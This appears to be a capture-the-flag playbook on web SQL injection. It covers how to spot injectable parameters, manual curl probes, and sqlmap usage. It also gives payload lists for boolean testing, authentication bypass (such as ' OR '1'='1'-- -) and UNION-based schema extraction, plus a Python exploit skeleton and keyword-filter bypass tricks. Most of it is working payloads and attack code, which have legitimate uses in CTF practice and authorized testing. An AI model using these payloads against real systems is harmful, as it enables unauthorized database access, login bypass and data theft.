# Web SQL Injection

## When to suspect this

- A URL/query/body parameter changes page content, row count, sorting, filtering, search results, login outcome, or error text.
- Source code builds SQL with string interpolation, concatenation, `format`, f-strings, template literals, or `sprintf`.
- You see DB errors such as `SQL syntax`, `SQLite`, `MySQL`, `PostgreSQL`, `ODBC`, `near "..."`.
- Numeric IDs accept arithmetic like `1+1`, `1-1`, `1 OR 1=1`.
- Login/search endpoints behave differently with `'`, `"`, `\`, comments, or parentheses.

## Fast triage checklist

- Capture a normal request with `curl -i` or Burp Repeater.
- Test one parameter at a time with quote, boolean, arithmetic, and comment probes.
- Compare status code, response length, redirect, timing, and visible rows.
- Identify DB flavor from errors, headers, source, container image, or syntax.
- Count columns with `ORDER BY` or `UNION SELECT NULL`.
- Check whether input is numeric, quoted string, LIKE pattern, ORDER BY, LIMIT, or INSERT/UPDATE context.
- Try alternate content types: query string, form, JSON, XML.
- Verify the primitive manually before running `sqlmap`.

## Manual confirmation

```bash
URL='http://HOST/item?id=1'
curl -sk "$URL'"
curl -sk "$URL AND 1=1-- -" -w '\nlen:%{size_download}\n'
curl -sk "$URL AND 1=2-- -" -w '\nlen:%{size_download}\n'
curl -sk "$URL ORDER BY 1-- -"
curl -sk "$URL ORDER BY 99-- -"
curl -sk "$URL UNION SELECT NULL-- -"
```

Positive confirmation:

- Quote causes SQL error or changed behavior.
- `AND 1=1` and `AND 1=2` differ.
- `ORDER BY N` reveals a column limit.
- `UNION SELECT` output reflects controlled values.

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| `curl` | Baseline and exact manual probes | `curl -sk "$URL?id=1'"` | Error or response delta |
| Burp/Caido Repeater | Compare responses while preserving cookies | Send `' AND 1=1-- -` | Length/content delta |
| `sqlmap` | After manual proof, for extraction | `sqlmap -u "$URL?id=1" --batch --dbs` | DBMS identified, DB list |
| `jq` | JSON API response diffing | `curl ... | jq .` | Field/value differences |
| [web-blind-sqli.md](web-blind-sqli.md) | No direct output/errors | Open when only boolean/time oracle exists | Byte-by-byte extraction |

## Payload starter pack

Boolean:

```text
' AND '1'='1'-- -
' AND '1'='2'-- -
1 AND 1=1-- -
1 AND 1=2-- -
```

Auth bypass:

```text
admin'-- -
' OR '1'='1'-- -
") OR ("1"="1
```

Union:

```text
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT 1,sqlite_version(),3-- -
' UNION SELECT 1,database(),3-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -
```

SQLite:

```text
' UNION SELECT 1,sqlite_version(),3-- -
' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table'-- -
' UNION SELECT 1,group_concat(sql),3 FROM sqlite_master-- -
```

## Exploit skeleton

```python
#!/usr/bin/env python3
import requests

URL = "http://HOST/path"
PARAM = "id"
COOKIE = {"session": "COOKIE"}

def send(payload):
    r = requests.get(URL, params={PARAM: payload}, cookies=COOKIE, timeout=10)
    print(r.status_code, len(r.text))
    print(r.text[:500])
    return r

send("1")
send("1 AND 1=1-- -")
send("1 AND 1=2-- -")
send("1 UNION SELECT NULL,NULL,NULL-- -")
```

## Escalation path

- If errors are visible, identify DB and extract schema manually.
- If boolean differences exist, switch to [web-blind-sqli.md](web-blind-sqli.md).
- If UNION works, enumerate tables, columns, then flag rows.
- If write is possible, try second-stage SSTI/upload/auth bypass.
- If filters block keywords, use comments, case changes, encodings, concatenation, or DB-specific functions.

## Common bypasses

- Comments: `-- -`, `#`, `/* */`, inline `UN/**/ION`.
- Case: `UnIoN SeLeCt`.
- Whitespace: tabs, newlines, comments, `/**/`.
- Strings: hex literals, `CHAR()`, concatenation.
- LIKE context: `%`, `_`, escaping.
- ORDER BY injection: `CASE WHEN(condition) THEN col ELSE other END`.
- Charset confusion: Shift-JIS/GBK quote escape edge cases.
- JSON APIs: try arrays/objects/null, not only strings.

## Rabbit holes

- Running `sqlmap` before proving the injectable parameter.
- Testing only GET when the app uses JSON POST.
- Assuming all differences are SQLi instead of authz/cache/search behavior.
- Forgetting WAF/filter may transform input before SQL.
- Extracting huge schemas before looking for `flag`, `secret`, `users`, `notes`.

## Final solve checklist

- You know the injectable parameter and context.
- You can reproduce the primitive with one manual command.
- You identified the DB flavor.
- You extracted the flag through reachable behavior, not source-only data.
- You saved the final request or script.

